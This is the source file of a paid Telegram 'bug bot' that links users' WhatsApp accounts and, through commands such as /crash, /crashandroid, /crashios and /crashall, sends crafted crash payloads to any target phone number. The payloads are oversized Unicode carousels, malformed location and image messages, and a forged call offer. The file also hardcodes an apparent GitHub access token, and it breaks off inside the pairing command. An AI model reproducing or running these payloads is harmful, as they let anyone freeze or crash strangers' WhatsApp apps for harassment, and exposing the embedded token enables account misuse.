/**
 * Custom Console Logging System
 * Optimized & Styled for better debugging.
 * Modified and Maintained by: COMMANDER (2026)
 * * لا تَأسَفَنَّ عَلَى غَدرِ الزَّمانِ لَطَالَمَا .. رَقَصَت عَلَى جُثَثِ الأُسُودِ كِلابُ
 * لا تَحسَبَنَّ بِرَقصِهَا تَعلُو عَلَى أَسيَادِهَا .. تَبقَى الأُسُودُ أُسُوداً وَالكِلابُ كِلابُ
 */

const { Bot, InlineKeyboard, InputFile } = require("grammy");
const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  relayMessage,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  encodeWAMessage,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  makeCacheableSignalKeyStore,
  WAProto,
  proto,  
  BaileysError,
  jidDecode,
  encodeSignedDeviceIdentity
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const crypto = require("crypto");
const { Boom } = require("@hapi/boom");
const axios = require("axios");
const config = require("./config");
const chalk = require("chalk");
const thumbnail = fs.existsSync("./storage/thumbnail.jpg")
  ? fs.readFileSync("./storage/thumbnail.jpg")
  : null;
const CHANNEL_ID = config.chanelid;
const GROUP_ID = config.chatgrupid;
const accesDb = JSON.parse(fs.readFileSync("./storage/access.json"));
const resDb = JSON.parse(fs.readFileSync("./storage/resellers.json"));
const bugProcesses = new Map();
const {
  isOwner,
  isReseller,
  isFreeMode,
  hasAccess,
  addReseller,
  removeReseller
} = require("./controlSystem/control");
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const bot = new Bot(config.telegramBotToken);
const control = require("./controlSystem/control.js");
const cooldown = require("./controlSystem/cooldown.js");
const cooldownModule = require("./controlSystem/sumemek.js");
const repo_gh = "ahmedabwnlhylh45-lab/comander";
const nama_file = "comander_db.json";
const path_ghp = "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";

let client;

/**
 * Custom Console Logging System
 * Optimized & Styled for better debugging.
 * Modified and Maintained by: COMMANDER (2026)
 * * لا تَأسَفَنَّ عَلَى غَدرِ الزَّمانِ لَطَالَمَا .. رَقَصَت عَلَى جُثَثِ الأُسُودِ كِلابُ
 * لا تَحسَبَنَّ بِرَقصِهَا تَعلُو عَلَى أَسيَادِهَا .. تَبقَى الأُسُودُ أُسُوداً وَالكِلابُ كِلابُ
 */

const log = {
  success: (msg) => console.log(chalk.green.bold("✓ ") + chalk.white(msg)),
  error: (msg) => console.log(chalk.red.bold("✗ ") + chalk.white(msg)),
  warning: (msg) => console.log(chalk.yellow.bold("⚠ ") + chalk.white(msg)),
  info: (msg) => console.log(chalk.blue.bold("ℹ ") + chalk.white(msg)),
  loading: (msg) => console.log(chalk.magenta.bold("⏳ ") + chalk.white(msg)),
  user: (msg) => console.log(chalk.cyan.bold("👤 ") + chalk.white(msg)),
  whatsapp: (msg) => console.log(chalk.green.bold("📱 ") + chalk.white(msg)),
  telegram: (msg) => console.log(chalk.blue.bold("✈️ ") + chalk.white(msg)),
  system: (msg) => console.log(chalk.gray.bold("⚙️  ") + chalk.white(msg)),
};

/**
 * إدارة النسخ الاحتياطي وحفظ الجلسات محلياً
 * [ نظام آمن ومستقل لكل مستخدم ]
 */

const waClients = {};
const sessionRoot = path.join(".", "session");
if (!fs.existsSync(sessionRoot))
  fs.mkdirSync(sessionRoot, {
    recursive: true,
  });

function getSessionPathForUser(userId) {
  return path.join(sessionRoot, String(userId));
}
async function checkSessionExistsForUser(userId) {
  try {
    const p = getSessionPathForUser(userId);
    await fs.promises.access(p);
    return true;
  } catch {
    return false;
  }
}
async function deleteSessionForUser(userId) {
  try {
    const p = getSessionPathForUser(userId);
    if (waClients[userId]?.sock) {
      try {
        waClients[userId].sock.end();
      } catch (e) {
        log.warning(`Failed to close socket for ${userId}: ${e.message}`);
      }
      delete waClients[userId];
    }
    await fs.promises.rm(p, {
      recursive: true,
      force: true,
    });
    log.success(`WhatsApp session for user ${userId} deleted successfully`);
    return true;
  } catch (err) {
    log.error(`Failed to delete session for ${userId}: ${err.message}`);
    return false;
  }
}
async function clearAllSessions() {
  try {
    const folders = fs.existsSync(sessionRoot)
      ? fs.readdirSync(sessionRoot)
      : [];
    for (const f of folders) {
      try {
        if (waClients[f]?.sock) {
          waClients[f].sock.end();
        }
        delete waClients[f];
      } catch (e) {
        log.warning(`Failed to close socket for ${f}: ${e.message}`);
      }
    }
    for (const f of folders) {
      const p = path.join(sessionRoot, f);
      try {
        await fs.promises.rm(p, { recursive: true, force: true });
      } catch (e) {
        log.warning(`Failed to delete session folder ${f}: ${e.message}`);
      }
    }

    log.success("All WhatsApp sessions cleared successfully");
    return true;
  } catch (err) {
    log.error(`Failed to clear all sessions: ${err.message}`);
    return false;
  }
}
async function reconnectExistingSessions() {
  try {
    const sessionFolders = fs.existsSync(sessionRoot)
      ? fs.readdirSync(sessionRoot)
      : [];

    if (sessionFolders.length > 0) {
      log.loading(
        `Found ${sessionFolders.length} saved WhatsApp sessions. Auto-reconnecting...`
      );

      for (const folder of sessionFolders) {
        const userId = folder;
        try {
          await initWhatsappForUser(userId, false);
          log.whatsapp(`Auto-reconnecting session for user ${userId}`);
        } catch (err) {
          log.warning(
            `Failed to auto-reconnect session for ${userId}: ${err.message}`
          );
        }
      }
    } else {
      log.info("No saved WhatsApp sessions found. Starting fresh.");
    }
  } catch (err) {
    log.error(`Error during auto-reconnect: ${err.message}`);
  }
}

async function initWhatsappForUser(
  telegramUserId,
  notifyUser = true,
  retryCount = 0
) {
  const MAX_RETRIES = 3;
  const RECONNECT_DELAY = 2000;
  const userId = String(telegramUserId);
  const sessionPath = getSessionPathForUser(userId);

  try {
    if (!fs.existsSync(sessionPath))
      fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    const sock = makeWASocket({
      logger: pino({ level: "silent" }),
      auth: state,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      syncFullHistory: false,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 30000,
      retryRequestDelayMs: 1000,
      messageRetryMap: new Map(),
      shouldIgnoreJid: (jid) => false,
      getMessage: async (key) => {
        return { conversation: "Message not available" };
      },
      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(
          message.buttonsMessage ||
          message.templateMessage ||
          message.listMessage
        );
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {},
                },
                ...message,
              },
            },
          };
        }
        return message;
      },
      printQRInTerminal: false,
      queryChatCount: 0,
    });

    sock.ev.on("creds.update", saveCreds);

    waClients[userId] = {
      sock,
      status: "connecting",
      sessionPath,
      reconnecting: false,
      lastActivity: Date.now(),
      messageCount: 0,
    };

    const connectionMonitor = setInterval(() => {
      if (waClients[userId]?.status === "open") {
        const timeSinceLastActivity =
          Date.now() - (waClients[userId].lastActivity || Date.now());
        if (timeSinceLastActivity > 120000) {
          log.info(`[Monitor] Sending keep-alive for ${userId}`);
          waClients[userId].lastActivity = Date.now();
        }
      }
    }, 60000);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update || {};

      try {
        if (connection === "close") {
          clearInterval(connectionMonitor);
          const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
          const disconnectReason =
            DisconnectReason[reason] || reason || "unknown";

          log.warning(`WA (${userId}) disconnected: ${disconnectReason}`);
          waClients[userId].status = "closed";

          if (
            reason === DisconnectReason.loggedOut ||
            reason === 401 ||
            reason === 403
          ) {
            log.warning(
              `Number for user ${userId} logged out / banned. Deleting session...`
            );
            try {
              if (waClients[userId]?.sock?.end) {
                waClients[userId].sock.end();
              }
            } catch (e) {
              log.warning(`Error closing socket for ${userId}: ${e.message}`);
            }

            await deleteSessionForUser(userId).catch(() => {});
            delete waClients[userId];

            try {
              await bot.api.sendMessage(
                telegramUserId,
                "🚫 *WhatsApp session removed*\nYour WhatsApp session was logged out or banned. Please re-pair using /reqpair.",
                { parse_mode: "Markdown" }
              );
            } catch (err) {
              log.warning(`Failed to notify user ${userId}: ${err.message}`);
            }
          } else {
            if (!waClients[userId]?.reconnecting && retryCount < MAX_RETRIES) {
              waClients[userId].reconnecting = true;
              log.loading(
                `Reconnecting WA for user ${userId} (attempt ${
                  retryCount + 1
                }/${MAX_RETRIES})...`
              );

              try {
                if (waClients[userId]?.sock?.end) {
                  waClients[userId].sock.end();
                }
                await new Promise((r) => setTimeout(r, 500));
              } catch (e) {
                log.warning(
                  `Error closing socket before reconnect for ${userId}: ${e.message}`
                );
              }

              setTimeout(() => {
                if (waClients[userId]) {
                  waClients[userId].reconnecting = false;
                  initWhatsappForUser(
                    telegramUserId,
                    notifyUser,
                    retryCount + 1
                  );
                }
              }, RECONNECT_DELAY);
            } else if (retryCount >= MAX_RETRIES) {
              log.error(
                `Failed to reconnect WA for user ${userId} after ${MAX_RETRIES} attempts.`
              );
              clearInterval(connectionMonitor);
              try {
                if (waClients[userId]?.sock?.end) {
                  waClients[userId].sock.end();
                }
                await deleteSessionForUser(userId).catch(() => {});
                delete waClients[userId];

                await bot.api.sendMessage(
                  telegramUserId,
                  "🚫 *WhatsApp session deleted*\nUnable to reconnect after 3 attempts. Please pair again using /reqpair.",
                  { parse_mode: "Markdown" }
                );
              } catch (err) {
                log.error(
                  `Failed to delete session for ${userId}: ${err.message}`
                );
              }
            }
          }
        } else if (connection === "open") {
          waClients[userId].status = "open";
          waClients[userId].lastActivity = Date.now();
          log.whatsapp(
            `✅ WhatsApp Connected Successfully for user ${userId}!`
          );

          const { pairingMessageId, waitMessageId } = waClients[userId] || {};
          try {
            if (pairingMessageId)
              await bot.api
                .deleteMessage(telegramUserId, pairingMessageId)
                .catch(() => {});
            if (waitMessageId)
              await bot.api
                .deleteMessage(telegramUserId, waitMessageId)
                .catch(() => {});
            waClients[userId].pairingMessageId = null;
            waClients[userId].waitMessageId = null;
          } catch (e) {
            log.warning(`Failed cleaning messages for ${userId}: ${e.message}`);
          }

          if (notifyUser) {
            try {
              await bot.api.sendMessage(
                telegramUserId,
                `✅ *WhatsApp paired successfully.*\nYour session is ready to use.`,
                { parse_mode: "Markdown" }
              );
            } catch (err) {
              log.warning(
                `Failed to notify pairing success for ${userId}: ${err.message}`
              );
            }
          }
        }
      } catch (e) {
        log.error(
          `Error in connection.update for user ${userId}: ${e.message}`
        );
      }
    });
    sock.ev.on("connection.error", (error) => {
      log.error(`Socket error for ${userId}: ${error.message}`);
    });

    return sock;
  } catch (err) {
    log.error(`Failed to init WhatsApp for user ${userId}: ${err.message}`);
    return null;
  }
}

async function requestPairingCodeForUser(telegramUserId, phone) {
  try {
    const userId = String(telegramUserId);
    let client = waClients[userId]?.sock;

    if (!client) {
      if (!waClients[userId]) {
        await initWhatsappForUser(userId, false);
        await new Promise((r) => setTimeout(r, 2000));
        client = waClients[userId]?.sock;
      } else {
        client = waClients[userId]?.sock;
      }
    }

    if (!client) throw new Error("Failed to create WA client for pairing");

    if (typeof client.requestPairingCode === "function") {
      const code = await client.requestPairingCode(phone);
      return code;
    } else {
      throw new Error("Pairing code API not available");
    }
  } catch (err) {
    throw err;
  }
}

// ============================================================
// 🦠 SYSTEM CRASH FUNCTIONS V3 - UPDATED & FIXED
// ============================================================

/**
 * دالة كراش أندرويد (تعمل على الإصدارات الأحدث)
 */
async function crashAndroid(client, X) {
    try {
        const payload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: "🦠" + "𑇂".repeat(30000) },
                        carouselMessage: {
                            cards: Array(30).fill({
                                header: {
                                    title: "X".repeat(5000),
                                    hasMediaAttachment: false
                                },
                                body: { text: "𑇂".repeat(30000) }
                            })
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 500 }, (_, i) => `1${i}@s.whatsapp.net`)
                        }
                    }
                }
            }
        };

        const msg = await generateWAMessageFromContent(X, payload, {});
        await client.relayMessage(X, msg.message, { messageId: msg.key.id });
        return true;
    } catch (err) {
        console.error("❌ crashAndroid error:", err);
        return false;
    }
}

/**
 * دالة كراش iOS (تعمل على الإصدارات الأحدث)
 */
async function crashIOS(client, X) {
    try {
        const payload = {
            locationMessage: {
                degreesLatitude: 999.9999,
                degreesLongitude: -999.9999,
                name: "𑇂".repeat(50000),
                address: "𑇂".repeat(50000),
                url: "https://" + "𑇂".repeat(50000) + ".com"
            }
        };

        const msg = await generateWAMessageFromContent(X, payload, {});
        await client.relayMessage(X, msg.message, { messageId: msg.key.id });
        return true;
    } catch (err) {
        console.error("❌ crashIOS error:", err);
        return false;
    }
}

/**
 * دالة كراش متقدمة (تجميد + تعطيل)
 */
async function crashAdvanced(client, X) {
    try {
        const payload = {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "\n".repeat(50000) },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: "{\"x\":\"" + "𑇂".repeat(900000) + "\"}",
                            version: 3
                        }
                    }
                }
            }
        };

        const msg = await generateWAMessageFromContent(X, payload, {});
        await client.relayMessage(X, msg.message, { messageId: msg.key.id });
        return true;
    } catch (err) {
        console.error("❌ crashAdvanced error:", err);
        return false;
    }
}

/**
 * دالة كراش عبر المكالمات
 */
async function crashCall(client, X) {
    try {
        let devices = (
            await client.getUSyncDevices([X], false, false)
        ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await client.assertSessions(devices);

        let callNode = {
            tag: "call",
            attrs: {
                to: X,
                id: client.generateMessageTag(),
                from: client.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                    "call-creator": client.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } }
                ]
            }]
        };

        await client.sendNode(callNode);
        return true;
    } catch (err) {
        console.error("❌ crashCall error:", err);
        return false;
    }
}

/**
 * دالة كراش بالصور المشوهة (ثغرة EXIF)
 */
async function crashImage(client, X) {
    try {
        const corruptedImage = Buffer.from(
            "FFD8FFE000104A46494600010100000100010000FFE1" +
            "0000" + "FF".repeat(10000) +
            "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" +
            "FFD9", "hex"
        );

        const payload = {
            imageMessage: {
                url: "data:image/jpeg;base64," + corruptedImage.toString('base64'),
                mimetype: "image/jpeg",
                fileSha256: crypto.randomBytes(32).toString('base64'),
                fileLength: "99999999",
                height: 9999,
                width: 9999,
                mediaKey: crypto.randomBytes(32).toString('base64'),
                caption: "𑇂".repeat(30000)
            }
        };

        const msg = await generateWAMessageFromContent(X, payload, {});
        await client.relayMessage(X, msg.message, { messageId: msg.key.id });
        return true;
    } catch (err) {
        console.error("❌ crashImage error:", err);
        return false;
    }
}

/**
 * دالة كراش مجمعة (تنفيذ جميع الأنواع)
 */
async function crashCombined(client, X) {
    const functions = [
        crashAndroid,
        crashIOS,
        crashAdvanced,
        crashCall,
        crashImage
    ];
    
    for (const fn of functions) {
        await fn(client, X);
        await new Promise(r => setTimeout(r, 500));
    }
    return true;
}

// ============================================================
// 📝 COMMANDS HANDLER
// ============================================================

bot.use(async (ctx, next) => {
  try {
    await next();
  } catch (err) {
    log.error(`Middleware error: ${err.message}`);
    try {
      await bot.api.sendMessage(
        config.ownerId,
        `An error occurred: ${err.message}`
      );
    } catch {}
  }
});

bot.use(async (ctx, next) => {
  try {
    if (ctx.chat?.type === "private") {
      const userPath = path.join("database", "users.json");
      const users = fs.existsSync(userPath)
        ? JSON.parse(fs.readFileSync(userPath, "utf8"))
        : [];
      const id = ctx.from.id.toString();
      const username = ctx.from.username
        ? `@${ctx.from.username}`
        : ctx.from.first_name || "Unknown";

      if (!users.includes(id)) {
        users.push(id);
        fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
        log.user(`New user registered: ${id} (${username})`);
        try {
          await bot.api.sendDocument(config.ownerId, new InputFile(userPath), {
            caption: `👤 *New User Registered!*\n\n🆔 ID: \`${id}\`\n💬 Username: ${username}\n📅 Time: ${new Date().toLocaleString()}`,
            parse_mode: "Markdown",
          });
        } catch {}
      }
    }
    await next();
  } catch (err) {
    log.error(`Register middleware error: ${err.message}`);
  }
});

bot.use(async (ctx, next) => {
  try {
    if (!ctx.chat || ctx.chat.type !== "private") return;

    const memberChannel = await ctx.api
      .getChatMember(CHANNEL_ID, ctx.from.id)
      .catch(() => null);
    const memberGroup = await ctx.api
      .getChatMember(GROUP_ID, ctx.from.id)
      .catch(() => null);
    const imageMenu = config.thumburl;

    if (
      !memberChannel ||
      ["left", "kicked"].includes(memberChannel.status) ||
      !memberGroup ||
      ["left", "kicked"].includes(memberGroup.status)
    ) {
      const keyboard = new InlineKeyboard()
        .url("📢 Join Channel", "https://t.me/Notfound_Comander")
        .row()
        .url("✉ Join Group", "https://t.me/NOTfound_COMANDERr")
        .row()
        .url("📱 Follow Whatsapp", "https://whatsapp.com/channel/0029Vb7t4UAFi8xjNTHgjl3P")
        .row()
        .url("🎵 Follow TikTok", "https://www.tiktok.com/@xcomanderxx")
        .row()
        .url("🎥 Subscribe Youtube", "https://youtube.com/@commander-g1k");

      return await ctx.replyWithPhoto(imageMenu, {
        caption: `⚠️ Access Denied

Hello, ${ctx.from.first_name} 👋
To unlock all features of this bot, you need to complete a few verification steps first.

🔐 Mandatory Access Requirements

- Join the Telegram Channel
- Join the Telegram Group
- Follow Instagram
- Follow Whatsapp channel
- Subscribe Youtube Channel 

Once all steps are completed, please send /start to continue.
Thank you for supporting us 🤍`.trim(),
        reply_markup: keyboard,
      });
    }

    await next();
  } catch (err) {
    log.error(`Cek wajib join error: ${err.message}`);
    await ctx.reply(
      "⚠️ Error memverifikasi join channel/group, coba lagi nanti."
    );
  }
});

bot.on("message", async (ctx) => {
  try {
    if (!ctx.message.text || !ctx.message.text.startsWith("/")) return;
    const [command, ...args] = ctx.message.text.slice(1).split(" ");
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name;
    log.info(
      `Command received: ${chalk.yellow(`/${command}`)} from ${chalk.cyan(
        `@${username}`
      )}`
    ); 
    if (!hasAccess(userId)) {
    return ctx.reply(`🔒 PREMIUM BOT ACTIVE
    
🚀 PREMIUM ACCESS REQUIRED
━━━━━━━━━━━━━━━━━━
[EN] This bot is restricted to premium users only.
[EG] البوت حالياً متاح فقط للمشتركين المميزين.

📊 SELECT YOUR PLAN | اختر خطتك المناسبة
━━━━━━━━━━━━━━━━━━
🔹 MONTHLY ACCESS | اشتراك شهري
💰 Price: $4 | 200 EGP
✅ Full Features + Updates
✅ Priority Support

🔹 FULL SCRIPT | سكربت البوت كاملاً
💰 Price: $15 | 750 EGP
✅ 100% No Encryption (Source Code)
✅ Own the Bot + Lifetime Updates
━━━━━━━━━━━━━━━━━━
🌍 PAYMENT METHODS | طرق الدفع
💎 Global: All Cryptocurrencies 
(USDT, BTC, etc.)

🇪🇬 Egypt: Vodafone Cash / InstaPay
━━━━━━━━━━━━━━━━━━
📩 CONTACT ADMIN TO BUY | تواصل للشراء
👤 Developer: @XComanderx


 ━━━━━━━━━━━━━━━━━━`);
  }
    switch (command) {
      case "start": {
        const username = ctx.from.username
          ? `@${ctx.from.username}`
          : ctx.from.first_name;
        const uptime = formatUptime(process.uptime());
        const usedMemory = (
          process.memoryUsage().heapUsed /
          1024 /
          1024
        ).toFixed(2);

        const caption = `<blockquote>
<b><i>{❓} Xzeso bot bug say hello ${username}</i></b>

<b>【Comander VIP Control v1.0】 🎮 </b>
───══════════════════───
➤ User    : ${username} 👤
➤ Dev     : @XComanderx 👨‍💻
➤ Time    : ${uptime} ⏱️
➤ Ram     : ${usedMemory} 💾
➤ Status  : 🟢 Plugin Active ✅
───══════════════════───

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @Xzeso13 for assistance
</blockquote>`.trim();

        const keyboard = new InlineKeyboard()
  .text("MENU BUG", "open_allmenu")
  .text("OWNER BUG", "open_allaccess")
  .row()
  .url("CHANNEL", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

        const imageMenu = config.thumburl;

        if (thumbnail) {
          await ctx.replyWithPhoto(imageMenu, {
            caption,
            parse_mode: "HTML",
            reply_markup: keyboard,
          });
        } else {
          await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: keyboard,
          });
        }

        log.success(`Start command executed for ${username}`);
        break;
      }

      // ===== أوامر الكراش المحدثة =====

      case "crash": {
        try {
          const userId = ctx.from.id.toString();
          const input = ctx.message.text.split(" ")[1];
          
          if (!input) {
            return ctx.reply(
              "⚠️ *Format Salah!*\n" +
              "Gunakan: `/crash 628xxxxxxx`\n" +
              "Contoh: `/crash 628123456789`",
              { parse_mode: "Markdown" }
            );
          }

          const target = input.trim().replace(/[^0-9]/g, "");
          if (!target || target.length < 10) {
            return ctx.reply("❌ Nomor tidak valid! (Min 10 digit)");
          }

          const X = `${target}@s.whatsapp.net`;
          const clientEntry = waClients[userId];
          
          if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
            return ctx.reply(
              "📵 *WhatsApp belum terhubung.*\n" +
              "Gunakan: `/reqpair 628xxxx`",
              { parse_mode: "Markdown" }
            );
          }

          const client = clientEntry.sock;
          
          await ctx.reply(
            `🦠 *تنفيذ الكراش المتقدم*\n` +
            `🎯 الهدف: \`${target}\`\n` +
            `📊 جاري تنفيذ 5 أنواع مختلفة...`,
            { parse_mode: "Markdown" }
          );

          await crashCombined(client, X);
          
          await ctx.reply(
            `✅ *تم تنفيذ الكراش بنجاح*\n` +
            `🎯 الهدف: \`${target}\``,
            { parse_mode: "Markdown" }
          );
          
        } catch (e) {
          log.error(`CRASH ERROR: ${e.message}`);
          await ctx.reply("❌ حدث خطأ أثناء تنفيذ الكراش.");
        }
        break;
      }

      case "crashandroid": {
        try {
          const userId = ctx.from.id.toString();
          const input = ctx.message.text.split(" ")[1];
          
          if (!input) {
            return ctx.reply(
              "⚠️ *Format:* `/crashandroid 628xxxxxxx`",
              { parse_mode: "Markdown" }
            );
          }

          const target = input.trim().replace(/[^0-9]/g, "");
          if (!target || target.length < 10) {
            return ctx.reply("❌ رقم غير صحيح!");
          }

          const X = `${target}@s.whatsapp.net`;
          const clientEntry = waClients[userId];
          
          if (!clientEntry || clientEntry.status !== "open") {
            return ctx.reply("📵 قم بربط واتساب أولاً: `/reqpair 628xxxx`");
          }

          const client = clientEntry.sock;
          
          await ctx.reply(`🦠 جاري كراش أندرويد: \`${target}\``, { parse_mode: "Markdown" });
          
          for (let i = 0; i < 5; i++) {
            await crashAndroid(client, X);
            await new Promise(r => setTimeout(r, 300));
          }
          
          await ctx.reply(`✅ تم كراش أندرويد: \`${target}\``, { parse_mode: "Markdown" });
          
        } catch (e) {
          log.error(`CRASHANDROID ERROR: ${e.message}`);
          await ctx.reply("❌ حدث خطأ.");
        }
        break;
      }

      case "crashios": {
        try {
          const userId = ctx.from.id.toString();
          const input = ctx.message.text.split(" ")[1];
          
          if (!input) {
            return ctx.reply(
              "⚠️ *Format:* `/crashios 628xxxxxxx`",
              { parse_mode: "Markdown" }
            );
          }

          const target = input.trim().replace(/[^0-9]/g, "");
          if (!target || target.length < 10) {
            return ctx.reply("❌ رقم غير صحيح!");
          }

          const X = `${target}@s.whatsapp.net`;
          const clientEntry = waClients[userId];
          
          if (!clientEntry || clientEntry.status !== "open") {
            return ctx.reply("📵 قم بربط واتساب أولاً: `/reqpair 628xxxx`");
          }

          const client = clientEntry.sock;
          
          await ctx.reply(`🦠 جاري كراش iOS: \`${target}\``, { parse_mode: "Markdown" });
          
          for (let i = 0; i < 5; i++) {
            await crashIOS(client, X);
            await new Promise(r => setTimeout(r, 300));
          }
          
          await ctx.reply(`✅ تم كراش iOS: \`${target}\``, { parse_mode: "Markdown" });
          
        } catch (e) {
          log.error(`CRASHIOS ERROR: ${e.message}`);
          await ctx.reply("❌ حدث خطأ.");
        }
        break;
      }

      case "crashall": {
        try {
          const userId = ctx.from.id.toString();
          const input = ctx.message.text.split(" ")[1];
          
          if (!input) {
            return ctx.reply(
              "⚠️ *Format:* `/crashall 628xxxxxxx`",
              { parse_mode: "Markdown" }
            );
          }

          const target = input.trim().replace(/[^0-9]/g, "");
          if (!target || target.length < 10) {
            return ctx.reply("❌ رقم غير صحيح!");
          }

          const X = `${target}@s.whatsapp.net`;
          const clientEntry = waClients[userId];
          
          if (!clientEntry || clientEntry.status !== "open") {
            return ctx.reply("📵 قم بربط واتساب أولاً: `/reqpair 628xxxx`");
          }

          const client = clientEntry.sock;
          
          await ctx.reply(
            `🦠 *تنفيذ جميع أنواع الكراش*\n` +
            `🎯 الهدف: \`${target}\`\n` +
            `📊 جاري تنفيذ 5 أنواع مختلفة...`,
            { parse_mode: "Markdown" }
          );
          
          await crashAndroid(client, X);
          await new Promise(r => setTimeout(r, 300));
          await crashIOS(client, X);
          await new Promise(r => setTimeout(r, 300));
          await crashAdvanced(client, X);
          await new Promise(r => setTimeout(r, 300));
          await crashCall(client, X);
          await new Promise(r => setTimeout(r, 300));
          await crashImage(client, X);
          
          await ctx.reply(
            `✅ *تم تنفيذ جميع أنواع الكراش*\n🎯 الهدف: \`${target}\``,
            { parse_mode: "Markdown" }
          );
          
        } catch (e) {
          log.error(`CRASHALL ERROR: ${e.message}`);
          await ctx.reply("❌ حدث خطأ.");
        }
        break;
      }

      case "clearsender": {
        try {
          const userId = ctx.from.id.toString();
          if (!checkCommandAccess(userId, "clearsender")) {
            return ctx.reply(getNoAccessMessage(userId));
          }

          const confirmMsg = await ctx.reply(
            "⚠️ *Peringatan!*\n\nAksi ini akan:\n❌ Menghapus SEMUA session WhatsApp\n❌ Menghapus SEMUA folder session\n✅ Restart bot otomatis\n\nLanjutkan?",
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ Ya, Hapus Semua",
                      callback_data: "clearsender_confirm",
                    },
                    { text: "❌ Batal", callback_data: "clearsender_cancel" },
                  ],
                ],
              },
            }
          );
        } catch (err) {
          log.error(`Error in /clearsender for ${userId}: ${err.message}`);
          await ctx.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
        }
        break;
      }

      case "cdon": {
        try {
          const userId = ctx.from.id.toString();
          if (!isOwner(ctx.from.id))
            return ctx.reply("❌ Hanya owner!");

          const cooldownModule = require("./controlSystem/sumemek.js");
          cooldownModule.enableCooldown();

          await ctx.reply(
            "✅ *Cooldown System Diaktifkan*\n\n" +
              "🔒 Commands yang di-cooldown (20 menit per penggunaan):\n" +
              "• /crash\n" +
              "• /crashandroid\n" +
              "• /crashios\n" +
              "• /crashall\n\n" +
              "⏰ Setiap user yang menggunakan command ini akan mendapat cooldown 20 menit.",
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          log.error(`CDON ERROR: ${e.message}`);
          await ctx.reply("❌ Terjadi kesalahan saat mengaktifkan cooldown.");
        }
        break;
      }

      case "cdoff": {
        try {
          const userId = ctx.from.id.toString();
          if (userId !== config.ownerId.toString()) {
            return ctx.reply(
              "❌ Hanya owner yang bisa menggunakan command ini."
            );
          }

          const cooldownModule = require("./controlSystem/sumemek.js");
          cooldownModule.disableCooldown();

          await ctx.reply(
            "✅ *Cooldown System Dimatikan*\n\n" +
              "🔓 User bisa menggunakan semua command tanpa cooldown.",
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          log.error(`CDOFF ERROR: ${e.message}`);
          await ctx.reply("❌ Terjadi kesalahan saat menonaktifkan cooldown.");
        }
        break;
      }

      case "setcd": {
        try {
          const userId = ctx.from.id.toString();
          const cooldownModule = require("./controlSystem/sumemek.js");

          const isEnabled = cooldownModule.isCooldownEnabled();
          const userStatus = cooldownModule.getUserCooldownStatus(userId);

          let message = "📊 *Status Cooldown System*\n";
          message += "═══════════════════════════════════\n\n";
          message += `🔧 *Status:* ${
            isEnabled ? "✅ AKTIF" : "❌ NONAKTIF"
          }\n\n`;

          message += "*📌 Cooldown User Kamu:*\n";
          message += "───────────────────────\n";

          for (const [cmd, info] of Object.entries(userStatus)) {
            const status = info.onCooldown
              ? `⏳ Cooldown (${info.remaining} menit)`
              : "✅ Siap Digunakan";
            message += `• /${cmd}: ${status}\n`;
            message += `  Last used: ${info.lastUsed}\n`;
          }

          message += "\n═══════════════════════════════════\n";
          message += "⏰ *Cooldown Duration:* 20 menit per command\n";
          message += "*💡 Tips:* Cooldown berlaku per-command per-user";

          await ctx.reply(message, { parse_mode: "Markdown" });
        } catch (e) {
          log.error(`SETCD ERROR: ${e.message}`);
          await ctx.reply("❌ Terjadi kesalahan saat membaca status cooldown.");
        }
        break;
      }

      case "reqpair": {
        try {
          const userId = ctx.from.id.toString();

          const phone = args[0]?.replace(/[^0-9]/g, "");
          if (!phone) {
            return await ctx.reply(
              "⚠️ *Format Salah!*\nContoh:\n`/reqpair 628xxxxxxx`",
              { parse_mode: "Markdown" }
            );
          }

